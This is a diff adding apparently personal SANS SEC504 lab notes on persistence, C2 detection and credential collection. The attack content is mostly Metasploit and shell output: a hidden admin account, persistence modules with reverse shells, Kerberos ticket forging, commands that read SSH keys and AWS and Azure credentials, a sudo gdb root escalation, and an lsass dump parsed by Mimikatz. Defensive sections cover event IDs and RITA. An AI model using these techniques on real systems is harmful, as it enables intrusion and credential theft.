@@ -1123,3 +1123,221 @@ TCP 0.0.0.0:8000 0.0.0.0:0 LISTENING 252 InHost
 
 ## Persistence
 
+- Regain access
+- Avoid detection
+- Preserve privileges and access
+- Flexible triggers for reestablishing access
+
+### Create account
+
+```
+meterpreter > execute -f "net user /add assetmgtacct Att@ckerPassw"
+Process 6892 created.
+meterpreter > execute -f "net localgroup administrators /add assetmgtacct"
+Process 7192 created.
+meterpreter > execute -i -f "net user"
+Process 3436 created.
+Channel 3 created.
+User accounts for \\WS-F43G01
+----------------------------------------------------------------------------
+Administrator assetmgtacct
+DefaultAccount WDAGUtilityAccount
+Guest Sec504
+The command completed with one or more errors.
+```
+
+### As a service
+
+```
+meterpreter > background
+[*] Backgrounding session 1...
+msf6 > use exploit/windows/local/persistence_service
+msf6 exploit(windows/local/persistence_service) > set session 1
+msf6 exploit(windows/local/persistence_service) > set lport 4445
+msf6 exploit(windows/local/persistence_service) > set lhost 10.10.75.1
+msf6 exploit(windows/local/persistence_service) > exploit
+[*] Started reverse TCP handler on 10.10.75.1:4445
+[*] Running module against SEC504STUDENT
+[+] Meterpreter service exe written to C:\WINDOWS\TEMP\LAGYmO.exe
+[*] Creating service EPjXQ
+[*] Meterpreter session 2 opened (10.10.75.1:4445 -> 10.10.0.1:1546) at
+2021-06-15 16:41:10
+```
+
+### WMI Event Subscription
+
+```
+C:\Temp> mofcomp wmi.mof
+Parsing MOF file: wmi.mof
+Done!
+```
+
+By default Meterpreter's `wmi_persistence` will make a hook for reestablishing, for specific failed logons, adding a delay of msec, after the logon failure
+
+```
+meterpreter > background
+[*] Backgrounding session 2...
+msf6 > use exploit/windows/local/wmi_persistence
+[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
+msf6 exploit(windows/local/wmi_persistence) > set session 2
+msf6 exploit(windows/local/wmi_persistence) > set lhost eth0
+msf6 exploit(windows/local/wmi_persistence) > set username_trigger josh
+msf6 exploit(windows/local/wmi_persistence) > set callback_interval 1000
+msf6 exploit(windows/local/wmi_persistence) > exploit
+[*] Installing Persistence...
+[+] Persistence installed! Call a shell using "smbclient \\\\10.10.0.1\\C$ -   <------- NOTE
+U josh <arbitrary password>"
+[*] Clean up Meterpreter RC file:
+/home/sec504/.msf4/logs/wmi_persistence/10.10.0.1_20210622.1735/10.10.0.1_20
+210622.1735.rc
+```
+
+### Kerberos
+
+1. Compromise DC: exploit domain admin or get compromised backup
+2. Get password hash for user `krbtgt`
+3. Mimikatz or Impacket let us t oforge TGT using krbtgt password hash
+4. TGT bypasses Kerberos authentication
+
+### Webshell
+
+### Defense
+
+#### Windows
+
+- Event subscriptions that contain queries: `Get-WMIObject -Namespace root\Subscription -Class __EventFilter | fl -property query`
+- `Autoruns` for auto-start programs
+- Monitor Windows Events:
+  - 4624: An account was successfully logged on
+  - 4634: An account was logged off
+  - 4672: Special privileges assigned to new logon
+  - 4732: A member was added to a security-enabled local group
+  - 4648: A logon was attempted using explicit credentials
+  - 4688: A new process has been created
+  - 4697: A service was installed in the system
+  - 4768: A Kerberos authentication ticket (TGT) was requested
+
+#### RITA: Real Intelligence Threat Analytics, rather than IDS
+
+- Look for patterns that matches C2 activities in the log of packets
+  - Too long connection
+  - Too much of fixed sized packets
+  - Consistent packet intervals
+  - Consistent size of packets or bytes sent
+- Uses logs generated from Zeek network analysis framework
+- Offline analysis only
+- Does not identify a specific C2 tools but only C2 activities
+- Higher score means more confident
+
+```
+sec504@slingshot:~$ sudo service mongod start
+sec504@slingshot:~$ mkdir zeeklogs && cd zeeklogs
+sec504@slingshot:~/zeeklogs$ zeek -Cr ~/big-capture.pcap
+sec504@slingshot:~/zeeklogs$ rita import . mynetwork
+sec504@slingshot:~/zeeklogs$ rita html-report mynetwork
+```
+
+```
+sec504@slingshot:~$ rita show-long-connections -H mynetwork | head -15
++---------------+-----------------+--------------------------+-----------+
+| SOURCE IP | DESTINATION IP | DSTPORT:PROTOCOL:SERVICE | DURATION |
++---------------+-----------------+--------------------------+-----------+
+| 10.55.100.100 | 65.52.108.225 | 443:tcp:- | 23h57m02s |
+| 10.55.100.107 | 111.221.29.113 | 443:tcp:- | 23h57m00s |
+| 10.55.100.109 | 65.52.108.218 | 443:tcp:- | 01h49m22s |
+| 10.55.100.104 | 65.52.108.204 | 443:tcp:- | 01h28m45s |
+| 10.55.182.100 | 104.244.43.112 | 443:tcp:ssl, | 10m00s |
+| | | 443:tcp:- | |
+| 10.55.182.100 | 23.52.162.21 | 443:tcp:ssl | 09m50s |
+| 10.55.182.100 | 198.8.70.210 | 443:tcp:-, | 07m29s |
+| | | 443:tcp:ssl | |
+| 10.55.182.100 | 104.20.168.10 | 443:tcp:ssl | 07m25s |
+| 10.55.182.100 | 104.16.162.13 | 443:tcp:ssl | 06m40s |
+| 10.55.100.108 | 65.52.108.191 | 443:tcp:ssl | 06m00s |
+```
+
+```
+sec504@slingshot:~$ rita show-exploded-dns mynetwork | head -15
+Domain,Unique Subdomains,Times Looked Up
+totallynotevil.net,7822,7822
+microsoft.com,36,5264
+fastly.net,17,603
+map.fastly.net,16,601
+mp.microsoft.com,15,315
+delivery.mp.microsoft.com,9,104
+windowsupdate.com,8,176
+akamaiedge.net,8,1791
+dl.delivery.mp.microsoft.com,8,37
+services.mozilla.com,8,2319
+mozilla.com,8,2319
+tlu.dl.delivery.mp.microsoft.com,7,23
+cloudfront.net,7,262
+download.windowsupdate.com,7,104
+```
+
+## Data Collection
+
+### Linux password harvesting
+
+| Target | Command |
+| Process list | ps -efw |
+| Users enter password in a login prompt by mistake | last -f /var/log/btmp |
+| Users enter password in shell | cat /home/\*/.\*history |
+| Saved passwords in web files | grep -iR password /var/www |
+| SSH keys | cat /home/\*/.ssh/\* |
+| History files of various types | cat /home/*/.mysql_history |
+| AWS credentials | cat /home/.aws/credentials |
+| Azure login token | cat /home/*/.azure/accessTokens.json |
+
+### sudo 
+
+```
+azawadow@x33-p98543:~$ sudo -l
+Matching Defaults entries for azawadow on x33-p98543:
+env_reset, exempt_group=sudo, mail_badpass,
+secure_path=/usr/local/sbin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+User azawadow may run the following commands on x33-p98543:
+(root) /usr/bin/gdb
+azawadow@x33-p98543:~$ sudo gdb -q
+(gdb) shell
+root@x33-p98543:~# id
+uid=0(root) gid=0(root) groups=0(root)
+root@x33-p98543:~#
+```
+
+### Mimikatz
+
+Cannot run directly, but can work on dumped memory by lsass
+
+```
+C:\temp> .\mimikatz.exe
+Program 'mimikatz.exe' failed to run: Operation did not complete successfully because the file contains a virus or potentially unwanted software
+C:\temp> .\procdump64.exe -accepteula -ma lsass.exe lsass.dmp
+ProcDump v9.0 - Sysinternals process dump utility
+Copyright (C) 2009-2017 Mark Russinovich and Andrew Richards
+Sysinternals - www.sysinternals.com
+[12:58:44] Dump 1 initiated: C:\temp\lsass.dmp
+[13:02:44] Dump 1 writing: Estimated dump file size is 51 MB.
+[13:02:45] Dump 1 complete: 51 MB written in 240.7 seconds
+
+---
+
+C:\Tools\mimikatz> .\mimikatz.exe
+mimikatz # sekurlsa::minidump lsass.dmp
+mimikatz # sekurlsa::logonPasswords full
+Opening : 'lsass.dmp' file for minidump...
+Session : Interactive from 1
+User Name : jwrig
+Domain : DELL
+msv :
+[00000003] Primary
+* Username : jwright@hasborg.com
+* Domain : MicrosoftAccount
+* NTLM : 920a********REDACTED********3fa4
+ssp :
+credman :
+[00000000]
+* Username : admin
+* Domain : 172.16.0.10
+* Password : _AhxmAKs3Xwx7VhQ@sCo
+```
